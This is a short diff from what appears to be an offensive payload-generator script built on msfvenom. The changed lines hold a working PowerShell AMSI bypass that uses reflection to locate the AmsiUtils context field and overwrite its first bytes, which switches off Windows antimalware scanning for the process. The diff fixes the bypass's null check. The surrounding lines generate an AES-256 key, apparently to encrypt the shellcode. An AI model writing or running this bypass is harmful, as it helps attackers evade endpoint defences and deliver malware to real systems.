@@ -116,8 +116,8 @@ if __name__ == '__main__':
 	else:
 		msfvenomoutput("Msfvenom warning messages - review to ensure all options successfully validated:", shellcode.stderr)
 
-	# Patch 1st 4 bytes of AmsiContext struct for the PS process. Attepts to not fail if no AMSI
-	amsiBypass = """$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like \"*iUtils\"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like \"*Context\") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);if($ptr -ne $null){[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)}"""
+	# Patch 1st 4 bytes of AmsiContext struct for the PS process. Does not fail if no AmsiContext buffer is found (Amsi not active)
+	amsiBypass = """$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like \"*iUtils\"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like \"*Context\") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);if($ptr -ne 0){[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)}"""
 
 	print("Generating AES-256 key...")
 	powershellkeygen = "$aesKey = New-Object byte[] 32;$rng = [Security.Cryptography.RNGCryptoServiceProvider]::Create();$rng.GetBytes($aesKey);$aesKey" #pwshgenerate random aes-256 key
